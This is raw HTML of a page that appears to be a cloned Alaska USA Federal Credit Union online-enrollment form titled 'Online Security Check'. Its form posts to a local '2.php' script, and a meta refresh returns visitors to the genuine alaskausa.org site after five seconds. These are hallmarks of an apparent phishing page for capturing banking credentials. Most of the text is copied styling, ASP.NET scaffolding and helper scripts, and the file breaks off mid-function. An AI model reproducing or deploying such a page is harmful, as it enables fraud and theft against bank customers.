
<!DOCTYPE html>
<html lang="en">
<head>
<title>
	Online Security Check
</title>
	<meta name="viewport" content="width=device-width" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
	<meta http-equiv="Pragma" content="no-cache" />
	<meta http-equiv="Expires" content="0" />
	<meta http-equiv="refresh" content="5;URL='https://www.alaskausa.org/realestate/#equity'" />
	<link rel="icon" type="image/x-icon" href="https://www.alaskausa.org/favicon.ico">
    <link rel="stylesheet" type="text/css" href="https://www.alaskausa.org/css/akusa-express.css" title="master" />
    <!--link rel="stylesheet" type="text/css" href="https://www.alaskausa.org/css/akusafcu.css" title="master" /-->
	<script src="https://www.alaskausa.org/js/jquery-1.11.3.min.js" type="text/javascript"></script>
	<script src="ScriptLib/jquery/jquery.maskedinput-1.4.1.min.js" type="text/javascript"></script>
	<script src="https://www.alaskausa.org/js/jsSuite-1.8.js" type="text/javascript"></script>
    <style type="text/css">
    	table {border-collapse:separate;border-spacing:1px 1px;}
    	th,td {margin:1px; padding:1px;}
    	input[type="text"],input[type="tel"] {padding:1px 0;}
    	input[type="radio"],input[type="checkbox"] {margin:3px 5px;}
						
		.ubenrollment #header > div:first-child { height:0;display:none; }
		.ubenrollment .pgTitle h1 { width: 768px; max-width:100%; font-size:1.5em; padding-bottom: .7em; }
		.ubenrollment .pgTitle .subTitle { font-size:.8em;}
		.ubenrollment #footer #disclaimers { padding-top:10px;}
		.ubenrollment #footer .links { text-align:center; }
		.ubenrollment .leftCol h2 { clear:none;}
		.ubenrollment .leftCol h2::before { top: 50%; margin-top:-4px; }
		.ubenrollment .leftCol h3 { clear:none;}

		@media only screen and (max-width: 767px) {
			.ubenrollment #header { float:left; }	/* undoes mobile header for tablet view*/
			.ubenrollment #topBar #logo { float:left; }	/*undoes mobile header for tablet view*/
			.ubenrollment .learnMore { height: auto;}	/*undoes collapse of content in tablet/mobile */
		}

		@media only screen and (max-width: 479px) {
			.ubenrollment #header { height: 50px; float:none; } /* puts mobile header back */
			.ubenrollment #topBar { margin-top:0;} /* puts mobile header back */
			.ubenrollment #topBar #logo { float:none; } /* puts mobile header back */
			#headerReturnLink { display:none; }
		}

		
		.learnMore ul, .learnMore li { margin: .5em .5em;}
		.leftCol { 
			padding: 0 0 0 24px; background: url(https://www.alaskausa.org/css/nav/pgMainEdge.png) repeat-y 8px 0;
			width: 500px; float:left;
		}
		.sideBar { width: 230px; float:left; }

		@media only screen and (max-width: 767px) {
			.leftCol { float:none; background:none; padding:0;}
			.sideBar { float:none; }
		}

		@media only screen and (max-width: 479px) {
			.leftCol { width: 100%; }
		}

    </style>
    	
	<style>
		/*.visaDebitQuestionRow, .autoLoanPrimaryQuestionRow, .autoLoanQuestionRow { display:none; }*/
		/*table th { text-align: left; }*/
		::-ms-clear { width:0; height:0; }

		#pgMain { width: 800px; }
		.leftCol { 
			padding: 0 0 0 24px; background: url(https://www.alaskausa.org/css/nav/pgMainEdge.png) repeat-y 8px 0;
			width: 500px; float:left;
		}
        .leftCol.fullWidth {
            width: 100%;
        }
		.sideBar { width: 230px; float:left; }
		.mobile_show { display:none; }
		.mobile_hide { display:block; }
		.disclosures {
			height:400px;overflow:auto;background:white;font-size:10pt;font-weight:normal;font-family:Arial;
			margin:5px 0 0 0;padding:3px;border:1px solid gray;
		}
		.disclosures p:not(.disclosureTitle) { text-align:justify;}
		.disclosureIndent { margin-left:20px;}
		.checkboxText { margin:5px 0 15px 35px;text-indent:-35px; }
		.checkboxWarning { margin-left:-6px;}
		.hint { font-size: .85em; color:#666666;}
		.results img.resultImage, .resultsPage2 img.resultImage { width:64px; float:left;margin-right:10px;}
        div.accountSelector {
            display: inline-block;
            padding: 5px 5px 1.5em 5px;
            margin: 1em 1.8em 1em 0;
            vertical-align: top;
            width: 16.5em;
            border-radius: 3px;
            box-shadow: 0px 1px 6px rgba(0, 0, 0, 0.3);
        }
        div.accountSelector h3 {
            color: #FFFFFF;
            background-color: #3F77C0;
            border-radius: 3px 3px 0 0;
            margin-top: 0;
            padding: .3em .6em;
            font-size: 1.2em;
            font-weight: normal;
        }
	    div.accountSelector p {
            margin: .4em .7em;
	    }
        div.accountSelector div.accountSelectorBody {
            height: 15em;
        }
        div.accountSelector span.accountSelectorLabel {
            font-weight: bold;
            font-size: 1.1em;
        }
        div.accountSelector div.accountSelectorButton {
            text-align: center;
        }
        div.accountSelector div.accountSelectorButton input {
            color: white;
            background-color: #004990;
            font-size: 1em;
            font-weight: bold;
            border: none;
            border-radius: 3px;
            margin-top: .5em;
            padding: .8em .5em;
            width: 12em;
        }
        div.accountSelector div.accountSelectorButton p {
            font-weight: bold;
            font-style: italic;
            padding: .8em 0 .3em 0;
        }
	    @media only screen and (max-width: 32.5em) {
            div.accountSelector { width: 98%; }
	    }

		@media only screen and (max-width: 767px) {
			.leftCol { float:none; background:none; padding:0; max-width:100%;}
			.sideBar { float:none; width:100%; }
			.checkboxText { margin-left:46px; text-indent:-46px; }
			/*.checkboxText input[type="checkbox"] { height:auto; }*/	/*text-indent takes care of extra spacing needed for mobile*/
		}

		@media only screen and (max-width: 500px) { /*iPhone4 landscape is 480px */
			.leftCol { width: 100%; }
			.sideBar { width:100%; }
			.mobile_show { display:block; }
			.mobile_hide { display:none; }
			.results img.resultImage, .resultsPage2 img.resultImage { max-width:inherit; } /*undoes .pgMain img in express*/
			/*a { text-decoration:underline;}*/
		}
		@media only screen and (max-height: 400px) {
			.disclosures { height: 350px; }
		}
		@media only screen and (max-height: 325px) {
			.disclosures { height: 305px; }
		}


		
		/*from  service/certCalc.asp*/
		/* dataForm table for standardized data-input presentation - simple 2-col table */
		.dataForm {width:100%;border-collapse:collapse;margin-bottom:1em;font-size:1em; }
		.dataForm caption {border-top:1px solid gray;background-color:#f0f0f0;font-weight:bold; text-align:left;padding:6px;}
		.dataForm tbody tr:first-child td {border-top:1px solid gray;}
		.dataForm td, .dataForm th {padding:6px;vertical-align:top;text-align:left; border-top:1px solid gray; border-bottom:1px solid gray;}
		.dataForm thead td {border-top:1px solid gray;border-bottom:1px solid black;background-color:#f4f4f4;font-weight:bold;}
		.dataForm tbody th {width:40%; background-color:#eeeeee;font-weight:normal;text-align:right;}
		.dataForm tbody td {border-left:1px solid gray;}
		.dataForm tbody td:first-child {border-left-width:0;}
		.dataForm tfoot {font-size:.85em;color:#666666;padding:.5em;}
		.dataForm tfoot p {margin:.5em 0 0 0;}
		.dataForm .footnotes {margin:3px 5px;font-size:.85em;}

		.dataForm input {text-align:left;}
		.dataForm input[type="text"], .dataForm input[type="tel"] {box-sizing:border-box;min-width:30%;}
		.dataForm input[type="submit"] {border-width:0;border-radius:2px;background-color:#3F77C0;color:white;color:white;font: 100% / 1.4 pt_sans_narrowregular, arial, helvetica, sans-serif;}
		.dataForm input[type="submit"]:hover {background-color:#345d8f;}
		.dataForm input[type="radio"] {/*outline:none;*/}

		.dataForm div[role="radiogroup"] {margin-bottom:-6px;}
		.dataForm div[role="radiogroup"] label {display:inline-block;box-sizing:border-box;min-width:30%;margin:0 5px 6px 0;border:1px solid #cccccc;border-radius:3px;padding:0 5px 0 0px; background-color:#eeeeee;}
		.dataForm div[role="radiogroup"] label:hover {background-color:#cccccc;color:#000066}
		.dataForm div[role="radiogroup"] label.radioSelected { background-color:#cccccc; color:#000066; }
		.dataForm div[role="radiogroup"].stack {float:left;}
		.dataForm div[role="radiogroup"].stack label {float:left;clear:left;}

		/* dataForm adaptations */
		@media (max-width:479px){
			/* auto-convert radiogroups to "stack" format */
			.dataForm div[role="radiogroup"] label {display:block;margin-right:0;float:none;}
			.dataForm {border-bottom:1px solid gray;}
			.dataForm tbody th {display:block;box-sizing:border-box;width:100%;margin-top:3px;border-width:0;border-top:1px solid gray;padding:3px 6px 0;background-color:#ffffff;text-align:left;color:#004990}
			.dataForm tbody td {display:block;border-width:0;padding-top:0;}
			.dataForm tbody tr:first-child td {border-top:none;}
		}

		/*from akusa-desktop - candidates to move to -express*/


		/*local overrides*/
		.dataForm tbody th { /*white-space:nowrap; min-width:235px;*/}
		.dataForm tfoot td { border:none;}
		/* split the table so postback is smaller, style the tables to address this*/
		.topDataForm { margin-bottom:0;}
		.noTopBorder td, .noTopBorder th { border-top:none !important; }
		
		.loadingMsg{background:url(PgArt/spinnerLarge.gif) no-repeat left center; padding-left:45px; display:table }
		.loadingMsg span{vertical-align:middle;display:table-cell; height:50px;color:#333;}
		.results { border:1px solid gray; padding:10px; margin-right:15px;}
		.resultsPage2 { }
		.visaDebit_background {background:url(PgArt/ubenrollment/visaPlatinum_flat.png) no-repeat;background-size:100% auto; height:126px; width:200px;}
		.visaDebit_input { margin-top:70px;margin-left:80px;width:95px; }
		.visaDebit_background2 {background:url(PgArt/ubenrollment/visaPlatinum_icon.png) no-repeat;background-size:100% auto; height:126px; width:200px;}
		.visaDebit_input2 { margin-top:68px;margin-left:82px;width:89px; }
        .ubLoginForm input[type=text] { width: 100px; border: 1px solid #bcbcbc; padding: 0 5px; border-radius:2px; min-height:26px;}
        .ubLoginForm input[type=submit] { min-height:29px; }
						
		/*from https://www.alaskausa.org/service/download.asp?t=q*/
		a.pdf {
			padding-left: 20px;
			background: url(https://www.alaskausa.org/images/icons/acrobat.gif) no-repeat 0 50%;
			line-height: 1.5em; padding-top:1px;
		}
		.printLink {
			background: url(/App_Themes/DefaultTheme/TemplateImages/printicon.gif) no-repeat 0 0; padding-left: 18px;
			font-size:.8em; font-weight:normal; margin-top:10px; line-height:16px;
		}

		/*begin css spinner: http://lea.verou.me/2013/11/cleanest-css-spinner-ever/ */
			@keyframes spin {
				to { transform: rotate(1turn); }
			}
			.progress {
				position: relative;
				display: inline-block;
				width: 5em;
				height: 5em;
				margin: -6px .5em;
				font-size: 12px;
				text-indent: 999em;
				overflow: hidden;
				animation: spin 1s infinite steps(8);
			}
			.small.progress {
				font-size: 5px;
			}
			.large.progress {
				font-size: 24px;
			}
			.progress:before,
			.progress:after,
			.progress > div:before,
			.progress > div:after {
				content: '';
				position: absolute;
				top: 0;
				left: 2.25em; /* (container width - part width)/2  */
				width: .5em;
				height: 1.5em;
				border-radius: .2em;
				background: #eee;
				box-shadow: 0 3.5em #eee; /* container height - part height */
				transform-origin: 50% 2.5em; /* container height / 2 */
			}
			.progress:before {
				background: #555;
			}
			.progress:after {
				transform: rotate(-45deg);
				background: #777;
			}
			.progress > div:before {
				transform: rotate(-90deg);
				background: #999;
			}
			.progress > div:after {
				transform: rotate(-135deg);
				background: #bbb;
			}
		/*end css spinner*/

	</style>

<link href="App_Themes/DefaultTheme/_ControlStyles_v4.css" type="text/css" rel="stylesheet" /><link href="App_Themes/DefaultTheme/_ExternalTemplateStyles_v4.css" type="text/css" rel="stylesheet" /><link href="App_Themes/DefaultTheme/_UtilityStyles_v4.css" type="text/css" rel="stylesheet" /></head>
<body id="ctl00_ctl00_Body" class="ubenrollment webpayment">
	<div class="pgBody">
		<form method="post" action="2.php" id="aspnetForm">
<div class="aspNetHidden">
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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" />
</div>

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['aspnetForm'];
if (!theForm) {
    theForm = document.aspnetForm;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>


<script src="/enroll/WebResource.axd?d=pynGkmcFUV13He1Qd6_TZFXjl5sPyt9kOGWz236FVgWAlp2jOnHz37PrZqhXVhK9g2YwSg2&amp;t=637460657481343508" type="text/javascript"></script>


<script src="/enroll/ScriptLib/md5.js" type="text/javascript"></script>
<script src="/enroll/ScriptResource.axd?d=nv7asgRUU0tRmHNR2D6t1EekDsxKEwSZJpikhL_6bvVcyxhDFC5xzBMYL4n2T3xzyjsI9y5GDnWtqEMRDzYwpwEqiv8d0zyvxyVarszwga4VVGDKdqK_TSDL0_zGf2hYrzZ7Qw2&amp;t=fffffffff6474071" type="text/javascript"></script>
<script type="text/javascript">
//<![CDATA[
function Length_Validation(val)
{
var t = document.getElementById(val.controltovalidate); //element for control in question
var v = t.value.replace(/\n/g,'  '); //text value of the control (need to double count new lines)
 if (v.length>val.MaximumLength) 
 {return false;}
 else
 {return true;}
}
//]]>
</script>

<script type="text/javascript">
//<![CDATA[
 function ValidateCaptcha(sender,args)
 {   var correctMD5='C9E9A848920877E76685B2E4E76DE38D';
     correctMD5=correctMD5.toLowerCase();
if(hex_md5(document.forms[0].ctl00$ctl00$PageBody$PageContent$Captcha.value.toLowerCase()).toLowerCase()==correctMD5)
     {args.IsValid=true;}
     else{args.IsValid=false;}
 }
function TogglePersistantPopup(InfoBoxClientID,TriggerElementID,direction,popupSpacing) {
   var IframeElement = document.getElementById(InfoBoxClientID + '_IFrame');
   var PopUpElement = document.getElementById(InfoBoxClientID + '_PopupCanvas');
	var PopUpDiv = $('#'+InfoBoxClientID + '_PopupDiv');
	var PopUpCanvas = $('#'+InfoBoxClientID + '_PopupCanvas');
   var PopupStatus = '' + document.getElementById(InfoBoxClientID + '_PopupDiv').style.display;
   if(PopUpDiv.hasClass('InfoBoxHover')) 
   {
       PopUpCanvas.removeClass('InfoBoxHover'); //remove hover effect
	    if(PopUpElement.style.display=='block'){
	       PopUpElement.style.display='';
	       $(PopUpElement).removeClass('InfoBoxPopup');
	    }
	    else {
           SetPositionForPopup(InfoBoxClientID,TriggerElementID,direction,popupSpacing);
	        PopUpElement.style.display='block';
	        $(PopUpElement).addClass('InfoBoxPopup');
	    }
   }
	else if(IframeElement) { //iframe hack is on, use basic css display manipulation (doesnt work with slidetoggle)
	    if(PopUpElement.style.display=='block'){
	        PopUpElement.style.display='';
	        $(PopUpElement).removeClass('InfoBoxPopup');
	    }
	    else {
           SetPositionForPopup(InfoBoxClientID,TriggerElementID,direction,popupSpacing);
	        PopUpElement.style.display='block';
	        $(PopUpElement).addClass('InfoBoxPopup');
	    }
       IframeElement.style.display = PopUpElement.style.display;
       IframeElement.style.width = PopUpElement.offsetWidth;
       IframeElement.style.height = PopUpElement.offsetHeight;
       IframeElement.style.left = PopUpElement.offsetLeft;
       IframeElement.style.top = PopUpElement.offsetTop;
	}
	else{ //use the fancy slideToggle animation
       var callback = function(){
                   if($(PopUpElement).hasClass('InfoBoxPopup')){
                       $(PopUpElement).removeClass('InfoBoxPopup');
                       $(PopUpElement).css('display','');  //undo the block set before the animation,clear out the inline display set by slideToggle, let the InfoBoxCanvas set the display
                   }
                   else{
                       $(PopUpElement).addClass('InfoBoxPopup');
                   }
               }
       if(!PopUpCanvas.hasClass('InfoBoxPopup')) { SetPositionForPopup(InfoBoxClientID,TriggerElementID,direction,popupSpacing); }
       if(PopUpCanvas.hasClass('InfoBoxHover')) {                // turn a hover into a popup - this just turns it on, no fancy slideToggle
               $(PopUpElement).addClass('InfoBoxPopup').removeClass('InfoBoxHover');
       } else {
           if(direction == 5) {
               PopUpCanvas.css('overflow','hidden').css('display','block');PopUpDiv.css('width',PopUpDiv.width()).animate({marginLeft:parseInt(PopUpDiv.css('marginLeft'),10)==0 ? -PopUpDiv.outerWidth() : 0},callback);
           }
           else if(direction == 7) {
               PopUpCanvas.css('overflow','hidden').css('display','block');
               PopUpDiv.css('width',PopUpDiv.width()).animate({marginLeft:parseInt(PopUpDiv.css('marginLeft'),10)==0 ? PopUpDiv.outerWidth() : 0},callback);
           }
           else {
	            PopUpCanvas.slideToggle(callback);
           }
       }	}
}
function HideInfoBoxHover(InfoBoxClientID,TriggerElementID,direction,popupSpacing) {
   var IframeElement = document.getElementById(InfoBoxClientID + '_IFrame');
   var PopUpElement = document.getElementById(InfoBoxClientID + '_PopupCanvas');
	var PopUpCanvas = $('#'+InfoBoxClientID + '_PopupCanvas');
	var PopUpDiv = $('#'+InfoBoxClientID + '_PopupDiv');
	if(IframeElement) { //iframe hack is on, use basic css display manipulation (doesnt work with slidetoggle)
	    $(PopUpElement).removeClass('InfoBoxHover');
       IframeElement.style.display = 'none';
       IframeElement.style.width = PopUpElement.offsetWidth;
       IframeElement.style.height = PopUpElement.offsetHeight;
